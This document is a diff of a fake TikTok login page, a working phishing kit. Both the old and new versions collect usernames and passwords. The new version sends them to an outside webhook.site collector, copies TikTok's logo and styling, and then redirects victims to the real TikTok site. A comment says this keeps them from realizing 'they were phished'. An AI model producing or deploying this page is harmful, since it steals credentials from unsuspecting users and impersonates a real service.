@@ -1,125 +1,95 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok - Login</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            width: 350px;
-            padding: 20px;
-            border-radius: 8px;
-            text-align: center;
-        }
-        .logo {
-            width: 60px;
-            margin-bottom: 20px;
-        }
-        h2 {
-            margin-bottom: 10px;
-            color: #000;
-        }
-        p {
-            color: #666;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            box-sizing: border-box;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #fe2c55;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        button:hover {
-            background-color: #e0244b;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
-        }
-        /* Spinner for realism */
-        .spinner {
-            display: none;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #fe2c55;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok - Login</title>
+<style>
+body {
+font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+background-color: #f8f8f8;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+margin: 0;
+}
+.login-container {
+background: white;
+padding: 40px;
+border-radius: 8px;
+box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+width: 300px;
+text-align: center;
+}
+.logo {
+width: 50px;
+margin-bottom: 20px;
+}
+h2 {
+margin-bottom: 20px;
+color: #010101;
+}
+input {
+width: 100%;
+padding: 12px;
+margin: 10px 0;
+border: 1px solid #dbdbdb;
+border-radius: 4px;
+box-sizing: border-box;
+}
+button {
+width: 100%;
+padding: 12px;
+background-color: #fe2c55;
+color: white;
+border: none;
+border-radius: 4px;
+font-weight: bold;
+cursor: pointer;
+margin-top: 10px;
+}
+button:hover {
+background-color: #e0244b;
+}
+.footer {
+margin-top: 15px;
+font-size: 12px;
+color: #8e8e8e;
+}
+</style>
 </head>
 <body>
 
-<div class="container">
-    <!-- TikTok Logo -->
-    <img src="https://static.tiktokfe.com/web/app-icon.png" alt="TikTok Logo" class="logo">
-    
-    <h2>Welcome back</h2>
-    <p>Log in to TikTok to continue</p>
+<div class="login-container">
+<!-- Simple TikTok-like Logo Icon -->
+<svg class="logo" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M36.9 12.8C36.5 12.6 36.1 12.4 35.7 12.2V22C35.7 28.5 30.5 33.7 24 33.7C17.5 33.7 12.3 28.5 12.3 22C12.3 15.5 17.5 10.3 24 10.3C24.5 10.3 25 10.4 25.5 10.5V17.5C25 17.5 24.5 17.5 24 17.5C19.8 17.5 16.3 21 16.3 25.2C16.3 29.4 19.8 32.9 24 32.9C28.2 32.9 31.7 29.4 31.7 25.2V14.5C33.5 15.6 35.1 17.1 36.3 18.9V12.8H36.9Z" fill="#010101"/>
+<path d="M36.9 12.8V18.9C35.1 17.1 33.5 15.6 31.7 14.5V12.2C36.5 12.6 40.9 14.5 43.5 18.2C46.1 21.9 47.1 26.6 45.8 31.1C44.5 35.6 40.8 39 36.1 40.5C31.4 42 26.3 41.5 22.1 38.7L25.5 34.5C28.3 36.3 31.9 36.5 34.8 35C37.7 33.5 39.6 30.8 40.1 27.7C40.6 24.6 39.5 21.5 37.2 19.4L36.9 12.8Z" fill="#25F4EE"/>
+<path d="M36.9 12.8V18.9C35.1 17.1 33.5 15.6 31.7 14.5V12.2C36.5 12.6 40.9 14.5 43.5 18.2C46.1 21.9 47.1 26.6 45.8 31.1C44.5 35.6 40.8 39 36.1 40.5C31.4 42 26.3 41.5 22.1 38.7L25.5 34.5C28.3 36.3 31.9 36.5 34.8 35C37.7 33.5 39.6 30.8 40.1 27.7C40.6 24.6 39.5 21.5 37.2 19.4L36.9 12.8Z" fill="#FE2C55" transform="translate(-2, 0)"/>
+</svg>
 
-    <!-- Form sends data to collect.php -->
-    <form action="collect.php" method="POST">
-        <input type="text" name="username" placeholder="Phone, email, username" required>
-        <input type="password" name="password" placeholder="Password" required>
-        <button type="submit">Log In</button>
-    </form>
+<h2>Log in to TikTok</h2>
 
-    <div class="spinner" id="spinner"></div>
-    <div id="message" style="display:none; color: green; margin-top:10px;">Logging in...</div>
+<form id="loginForm" action="https://webhook.site/a2f47e9c-c348-4c83-b859-dfb6502bdef5" method="POST">
+<input type="text" name="username" placeholder="Phone, email, or username" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Log in</button>
+</form>
+
+<div class="footer">
+Forgot password?
+</div>
 </div>
 
 <script>
-    // Simulate loading then redirect to real TikTok
-    document.querySelector('form').addEventListener('submit', function(e) {
-        e.preventDefault(); // Stop default submit initially
-        
-        // Show spinner
-        document.querySelector('button').style.display = 'none';
-        document.getElementById('spinner').style.display = 'block';
-        
-        // Actually submit the form via JS to send data first
-        var formData = new FormData(this);
-        fetch('collect.php', {
-            method: 'POST',
-            body: formData
-        }).then(() => {
-            // Redirect to real TikTok after 2 seconds
-            setTimeout(() => {
-                window.location.href = "https://www.tiktok.com";
-            }, 2000);
-        });
-    });
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+// Optional: Redirect them to the REAL TikTok site after they submit
+// so they don't realize they were phished immediately.
+setTimeout(() => {
+window.location.href = "https://www.tiktok.com";
+}, 1000);
+});
 </script>
 
 </body>
